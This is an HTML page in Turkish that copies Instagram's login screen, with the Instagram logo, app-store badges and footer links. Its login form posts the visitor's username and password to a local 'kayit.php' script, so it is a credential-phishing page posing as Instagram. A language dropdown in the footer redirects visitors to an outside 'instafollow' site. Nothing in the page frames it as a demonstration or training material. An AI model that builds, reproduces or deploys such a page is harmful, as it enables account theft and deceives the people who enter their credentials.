<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <title>Instagram</title>
</head>
<body>
  <span id="root">
    <section class="section-all">

      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">

                </div><!-- Header bitiş -->
                
                <div class="form-wrap">
                  <form class="form">

                    <div class="input-box">
                      <form action="kayit.php" method="POST">
                      <input type="text" id="name" placeholder="Telefon numarası, Kullanıcı adı veya e-posta" maxlength="30" name="username" required>
                    </div>  

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="şifre" maxlength="30" required>
                    </div>  
                    
                    <span class="button-box">
                      <button class="btn">Giriş yap</a></button>
                    </span>  

                    <a class="forgot" href="#">Şifreni mi unuttun?</a>
                  </form>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Hesabın yokmu?<a href="#">Kaydol</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Uygulamayı indir.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                  <img alt="App Store'dan İndir" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yD/r/WFzmKhSYqya.png">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                  <img alt="Google Play'den indir" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yp/r/XUCupIzGmzB.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="">Meta</a></li>
              <li><a href="">Hakkında</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">İş Fırsatları</a></li>
              <li><a href="">Yardım</a></li>
              <li><a href="">Apı</a></li>
              <li><a href="">Gizlilik</a></li>
              <li><a href="">Koşullar</a></li>
              <li><a href="">Konu Etiketleri</a></li>
              <li><a href="">Konumlar</a></li>
              <li><a href="">Instagram Lite</a></li>
              <li>
                <span class="language">Dil
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2022 Instagram from Meta</span>
        </div> <!-- Footer container end -->
      </footer>
      
    </section>
  </span> <!-- Root -->

  <!-- Select Link -->
  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>
</body>
</html>